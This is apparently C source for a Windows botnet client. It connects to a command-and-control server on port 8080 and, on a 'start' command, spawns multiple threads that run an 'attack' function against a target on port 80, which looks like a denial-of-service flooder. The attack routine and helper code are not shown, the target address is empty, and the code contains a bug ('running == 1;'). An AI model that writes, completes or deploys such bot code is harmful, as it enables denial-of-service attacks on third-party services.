#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include "utils.h"

volatile int running = 0;
HANDLE attack_threads [NUM_THREADS];

int main() {

    char cmd_buff[1024];
    char output_buff[1024]; 

    // server socket details and setup
    SOCKET server_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";

    startWinsock(&wsaData);
    server_socket = startSocket();
    connectSocket(&serv_addr, server_socket, server_ip);

    while (1) {
        memset(cmd_buff, 0, 1024);
        memset(output_buff, 0, 1024);
        receiveCommand(server_socket, cmd_buff);

        if (strcmp(cmd_buff, "start") == 0){
            struct address target_addr;
            target_addr.ip = "";
            target_addr.port = 80;
            printf("Executing attack...\n");
            running == 1;
            for (int i=0; i<NUM_THREADS; i++){
                attack_threads[i] = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
                // printf("Thread created");
                if (attack_threads[i] == NULL){
                    printf("error creating thread \n");
                }
            }
        } else if (strcmp(cmd_buff, "stop") == 0){
            running = 0;
            printf("Stopping attack...\n");
            WaitForMultipleObjects(NUM_THREADS, attack_threads, TRUE, 10000);
            for (int i=0; i<NUM_THREADS; i++){
                CloseHandle(attack_threads[i]);
            }
            // closeSocket(server_socket);
            // break;
        }
    }

    return 0;
}
